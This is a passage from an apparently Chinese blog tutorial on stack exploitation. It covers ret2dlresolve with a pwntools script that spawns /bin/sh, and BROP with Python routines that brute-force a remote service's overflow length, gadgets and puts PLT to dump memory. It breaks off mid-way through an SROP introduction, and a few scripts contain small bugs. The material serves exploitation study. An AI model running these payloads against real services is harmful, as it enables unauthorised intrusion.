class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr        r_offset;</span><br><span class="line">    Elf32_Word       r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword        r_addend;                <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure><p>攻击方法：</p><ol><li><p>程序没有开启RELRO</p><p> 那么我们可以任意修改.dynamic段（数组）里的内容。首先在一块可控的内存区域内伪造一个字符串表，将func字符串（func可以为libc中的任意目标函数，例如read，puts等）替换为system字符串，之后修改.dynamic里的字符串表地址（.dynstr，该地址很容易通过tag查到）为我们伪造的字符串表地址，最后通过栈溢出修改ret为func@plt的第二条指令的地址，也就是<code>push func_index</code>，这样就会为func调用一次_dl_runtime_resolve，这样根据符号名解析到的就是system函数，最后会执行system函数。</p></li><li><p>开启了Partial RELRO</p><p> 这时就不可以修改.dynamic中的值了，但是可以通过伪造.rel.plt表实现。虽然从.dynamic中取出的.rel.plt地址我们不可以控制，但是reloc_index是在栈中，因此可以被我们控制，所以通过.rel.plt地址+reloc_index我们就可以控制重定位表指针rel的值，精心构造的reloc_index可以让rel指向我们伪造的一个重定位表项，这时<code>rel-&gt;r_info</code>我们也可以控制，就可以控制.dynsym动态链接符号表中的下标。同样类似控制rel，虽然从.dynamic中取出的.dynsym地址不可以控制，但是下标是可以控制的，因此我们也可以控制.dynsym的地址+下标偏移得到对应符号表项的指针sym，可以使sym指向我们伪造的一个sym表项，在伪造的sym表项中我们可以控制<code>sym-&gt;st_name</code>，这样我们就可以控制.dynstr地址+<code>sym-&gt;st_name</code>所指向的的符号名为我们控制的字符串，例如system，同样调用_dl_runtime_resolve的时候可以执行system，最后需要注意的是<code>rel-&gt;r_offset</code>指向的地址需要可写。综上所述，具体利用步骤如下。</p><ol><li><p>计算reloc_index。通过<code>objdump -s -j .rel.plt ./pwn</code>获取.rel.plt在程序中的偏移offset，因此<code>reloc_index = fake_rel_plt_addr - offset</code></p></li><li><p>找一个可控内存伪造rel表项，其中r_offset需要可写</p></li><li><p>计算rel表项中的r_info。通过<code>objdump -s -j .dynsym ./pwn</code>获取.dynsym在程序中的偏移offset，因此<code>r_info = ((fake_dynsym_addr - offset) / 0x10)&lt;&lt;8 + 0x7</code></p></li><li><p>找一个可控内存伪造sym表项。表项中其他值都不重要，重要的是st_name的值。</p></li><li><p>计算sym中的st_name。通过<code>objdump -s -j .dynstr ./pwn</code>获取.dynstr在程序中的偏移offset，因此<code>st_name = fake_dynstr_addr - offset</code></p></li><li><p>找一个可控内存fake_dynstr_addr写入想要解析的符号字符串，例如system</p></li><li><p>至此rel表项，sym表项和符号都伪造完成，也计算出了reloc_index，所以直接将reloc_index放在栈顶，然后跳转到plt表项中直接<code>jmp plt[0]</code>的地址即可。</p></li><li><p>若栈上的值实在不好控制，则可以通过栈迁移将栈转移到bss段在进行操作，需要注意内存对齐的情况。</p></li><li><p>由于上述手工步骤过于复杂，而且有很多重复操作的步骤，也容易出错，因此pwntools中集成了关于ret2dlreslove的利用方法，下面的示例来自ctf-wiki。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools will help us choose a proper addr</span></span><br><span class="line"><span class="comment"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span></span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr)</span><br><span class="line"></span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">112</span> + rop.chain() + <span class="string">&#x27;a&#x27;</span> * <span class="number">256</span> + dlresolve.payload</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ol></li><li><p>开启了Full RELRO</p><p> 这种情况下程序中使用的动态链接的函数在程序开始执行之前就被解析完毕，_dl_runtime_reslove和got表也就用不到了，而且.dynamic和got表都不可写，无法利用。</p></li></ol><h2 id="0x88-BROP"><a href="#0x88-BROP" class="headerlink" title="0x88 BROP"></a>0x88 BROP</h2><p>BROP就是Blind ROP，也就是ROP盲打，指在没有程序可执行文件的情况下利用ROP进行盲打。</p><p>攻击前提：</p><ol><li>必须存在栈溢出可以覆盖ret地址劫持控制流</li><li>程序崩溃后可以自动重启，并且重启后地址不变（例如nginx，mysql，apache，openssh等服务器）</li></ol><p>攻击步骤：</p><ol><li><p>获取栈溢出长度</p><p> 非常简单，通过枚举即可，每次增加一个字节直到程序报错</p></li><li><p>绕过canary</p><p> 通过逐字节爆破canary，主要用了 0x82节中的爆破方法获取到canary</p></li><li><p>rop</p><p> 找到canary以后我们就可以控制ret了，这时候就需要找到合适的garget来形成rop链。</p></li></ol><p>由于我们不知道程序里的代码，所以想直接找到一个syscall几乎是不可能的，因此首要任务就是先想办法可以打印出程序的内存，使我们可以获取更多的信息，这是我们的目标。即然需要打印程序，那么就需要函数调用/系统调用，首先就需要找到可以控制寄存器的gadgets。通过0x85节我们可以知道在csu中有一段通用的gadgets，如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure><p>但是我们想控制的是rdi，rsi和rdx这三个寄存器（这三个寄存器中保存函数参数），但是从csu的gadget中，如果从0x400621（0x40061A+7）处开始，这一段gadget就变成了<code>pop rsi; pop r15; ret</code>，如果从0x400623（0x40061A+9）处开始，这一段gadget就变成了<code>pop rdi; ret</code>，这样我们就有了两个已知的可以控制rdi和rsi的gadgets，但是gadgets的具体位置，我们还是一无所知，只能通过猜测+测试的方法获取gadgets。</p><p>首先我们将程序的gadgets分为3类：stop gadgets，trap gadgets和probe gadgets。Probe gadgets就是我们猜测并且需要测试的gadgets，对于64位程序，可以直接从0x400000开始尝试，如果不成功则程序可能开启了PIE，或者这是32位的程序。Stop gadgets是一段不会使程序立即崩溃的gadgets，也就是说程序控制流跳转到stop gadgets以后还可以正常运行一段时间，之后可能会发生崩溃。Trap gadgets则是一段可以立即使程序崩溃的gadgets，其实trap gadgets可以不是一段gadgets，甚至可以是一个非法地址，只要程序跳转到trap以后可以立即崩溃就行。最后，通过stop和trap在栈上的不同布局，我们就可以测试我们猜测的prob是否是一段正确的gadgets（其实原理上类似SQL注入的时间盲注），有如下几个例子。</p><ol><li><p>测试不会对栈进行操作的gadgets，例如<code>ret</code>，<code>xor eax, eax; ret</code>等，若没有进行pop或push，则会直接跳转到stop，程序不会立即崩溃，否则就会跳转到trap，程序会立即崩溃，后续几个例子的原理相同。</p><p> buf | canary | probe | stop | trap | trap | … |</p></li><li><p>测试只pop一次的gadgets。</p><p> buf | canary | probe | trap | stop | trap | trap | … |</p></li><li><p>测试pop了两次的gadgets，可以依此类推寻找pop多次的gadgets</p><p> buf | canary | probe | trap | trap | stop | trap | trap | .. |</p></li><li><p>测试probe是不是一个stop gadgets，若probe是一个stop gadgets，则程序不会立即崩溃，否则就会立即崩溃</p><p> buf | canary | probe | trap | trap | … |</p></li><li><p>找到到csu中那连续6个pop的gadgets（非常重要，找到这个gadgets就相当于可以控制很多寄存器）</p><p> buf | canary | probe | trap | trap | trap | trap | trap | trap | stop | trap | trap | … |</p></li></ol><p>关于识别plt表，plt相对比较稳定，跳转到plt以后程序一般不会崩溃。plt表的每一项都是16字节长，所以若连续16次测试probe的时候程序都没有崩溃（例如从0x400000开始尝试，尝试到0x400010，这些probe都是gadgets），那么很可能遇到了plt表。此外，plt中的一项包含了3条指令<code>jmp func@got; push func_index; jmp plt[0]</code>，第一条指令jmp长6字节，第二条指令push长5字节，最后一个jmp指令长5字节，因此可以通过前后偏移6字节来确定哪一个probe是plt表项的中间（即是处于push还是处于第一个jmp）。</p><p>此时虽然我们找到了plt表，但是还不能确定哪一个是输出函数（例如puts），我们最终的目标是调用输出函数打印程序内存。例如寻找puts函数，我们只需要控制rdi即可（puts只接受一个参数），那么我们可以依次遍历每一个plt表项，每次遍历的step为16字节，之后我们控制rdi为程序的开头也就是0x400000（未开启PIE），ELF开头的4个字节一般为<code>\x7fELF</code>，所以如果某一个plt表项调用完以后发现程序输出了这4个字节，那么那就是puts的plt表项，找到了puts的地址以后我们就可以随心所欲输出程序地址的内存了，甚至可以把代码段全打印出来供我们离线寻找更多的gadgets。</p><p>综上所述，brop的一般过程如下所述。首先确定溢出长度，exp如下，注意，若遇到了canary则该函数返回的仅为buf长度，若没有canary（比较少见），则该函数返回的包括了old ebp的长度。其中<code>get_remote_conn</code>函数可以获取一个remote conn，<code>conn_send_recv</code>函数负责发送和接收data。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_overflow_length</span>():</span></span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote_conn()</span><br><span class="line">            output = conn_send_recv(conn, <span class="string">&#x27;a&#x27;</span> * length)</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="comment"># OK means remote not crash.</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># Crash and output something else.</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> length - <span class="number">1</span></span><br></pre></td></tr></table></figure><p>之后需要寻找stop gadgets，exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_gadget</span>(<span class="params">buf_length, canary=None</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote_conn()</span><br><span class="line">            conn_send_recv(conn. payload + p64(addr))</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>找到stop gadgets以后就成功了一半了，剩下的就是寻找plt的地址以及遍历plt找到puts的地址。首先是寻找plt的exp，注意程序可能不止一处连续16次都不崩溃，所以最好根据不同的start_addr多尝试几次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_plt</span>(<span class="params">start_addr, buf_length, stop_gadgets, canary=None</span>):</span></span><br><span class="line">    addr = start_addr  <span class="comment"># Which address you want to start.</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += <span class="string">&#x27;%s&#x27;</span>  <span class="comment"># Probe addr</span></span><br><span class="line">    payload += p64(stop_gadgets)  <span class="comment"># Stop gadgets addr</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span>  <span class="comment"># 10 Traps.</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote_conn()</span><br><span class="line">            conn_send_recv(conn, payload % p64(addr))</span><br><span class="line">            conn.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == <span class="number">16</span>:</span><br><span class="line">                <span class="keyword">return</span> addr - <span class="number">16</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            count = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>寻找csu中的gadgets地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_csu</span>(<span class="params">buf_legnth, stop_gadgets, canary=None</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += <span class="string">&#x27;%s&#x27;</span>  <span class="comment"># Probe addr</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">6</span>  <span class="comment"># 6 traps</span></span><br><span class="line">    payload += p64(stop_gadgets)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span>  <span class="comment"># 10 traps</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote()</span><br><span class="line">            output = conn_send_recv(conn, payload % p64(addr))</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>找到csu的gadgets地址以后，通过偏移9就可以得到<code>pop rdi; ret</code>的gadgets，这样我们就可以控制puts的参数，然后是寻找puts的plt地址（其实也可以把step从16调整为1）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_plt</span>(<span class="params">plt_addr, buf_length, pop_rdi_ret, stop_gadgets, canary=None</span>):</span></span><br><span class="line">    addr = plt_addr  <span class="comment"># plt address</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(<span class="number">0x400000</span>)  <span class="comment"># # ELF start address</span></span><br><span class="line">    payload += <span class="string">&#x27;%s&#x27;</span>  <span class="comment"># Probe addr</span></span><br><span class="line">    payload += p64(stop_gadgets)  <span class="comment"># Stop gadgets addr</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span>  <span class="comment"># 10 Traps.</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote()</span><br><span class="line">            output = conn_send_recv(conn, payload % p64(addr))</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">if</span> output.startswith(<span class="string">&#x27;\x7fELF&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            print(<span class="string">&#x27;[!] Crash found! Maybe invalid plt address. continue finding...&#x27;</span>)</span><br><span class="line">        addr += <span class="number">16</span></span><br></pre></td></tr></table></figure><p>最后就是调用puts打印各种地址内存了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span>(<span class="params">addr, puts_plt, buf_length, pop_rdi_ret, stop_gadgets, canary=None</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(puts_plt)</span><br><span class="line">    payload += p64(stop_gadgets)</span><br><span class="line">   data = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn = get_remote()</span><br><span class="line">        data = conn_send_recv(conn, payload)</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        conn.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h2 id="0x89-SROP"><a href="#0x89-SROP" class="headerlink" title="0x89 SROP"></a>0x89 SROP</h2><p>SROP即Sigreturn-Oriented Programming（面向Sigreturn编程），sigreturn是一个系统调用，当unix系统发生signal的时候会被间接调用。</p><p>当内核向一个进程发送一个signal的时候，该进程会被暂时挂起，然后进入内核态，在进入内核态之前，内核会将进程的上下文保存在栈中，这个上下文被称为ucontext，其中包含了当前所有寄存器的值，之后将signal信息也就是siginfo压入栈中，然后将指向sigreturn系统调用的地址压入栈中，这样内核态执行完毕以后就可以执行sigreurn系统调用恢复保存在栈中的进程所有寄存器的值，其中，ucontext以及siginfo被称为Signal Frame。32位sigreturn的调用号位77，64位sigreturn的调用号位15。</p><p>32位系统下的Signal Frame结构如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs, __gsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs, __fsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> es, __esh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ds, __dsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eax;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs, __csh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>64位系统下的Signal Frame结构如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="keyword">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        swd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        fop;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="keyword">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> 